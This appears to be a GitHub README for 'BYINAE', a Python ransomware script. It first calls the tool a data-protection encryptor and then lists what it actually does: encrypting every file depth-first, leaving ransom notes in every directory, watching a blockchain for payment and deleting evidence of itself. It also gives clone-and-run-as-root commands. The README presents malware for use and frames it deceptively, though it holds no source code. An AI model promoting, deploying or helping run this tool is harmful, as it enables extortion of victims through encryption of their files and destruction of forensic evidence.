**AUTHOR:**

**Description:**

`BYINAE` is a `highly` `advanced` data `encryption` `tool` that uses `military-grade` `algorithms` to `encrypt` your `files`. It is `designed` to be `unstoppable` and `unbreakable`, making it the `perfect tool` for those who want to `protect` their `data` from `unauthorized access`.

**Features:**

* `Encrypts files` using `AES-128-CBC` wrapped in a `SHA256 HMAC`
* Uses a `32-byte` `URL-safe` `base64` key for `encryption`
* Encrypts files in a `depth-first search manner`, ensuring that all files are `encrypted`
* Leaves a `ransom note` in `every directory`, `demanding payment` in exchange for the `decryption key`
* Monitors the `blockchain` for `payment` and `triggers` `self-destruction` if `payment` is `received`
* `Deletes all evidence` of the `script` and its `traces` after `payment` is `received`

**Usage:**

1. Run the script as `root`.
```
git clone https://github.com/Rip70022/BYINAE
```
```
cd BYINAE
```
```
sudo python3 BYINAE.py
```
3. The script will begin `encrypting files` in a `depth-first` search manner.
4. A `ransom note` will be left in `every directory`, demanding `payment` in `exchange` for the `decryption key`.
5. The script will `monitor` the `blockchain` for `payment` and `trigger` `self-destruction` if `payment is received`.

**Requirements:**

* `Python 3.x`
* `cryptography library`
* `Linux` or `Windows` operating system - OS
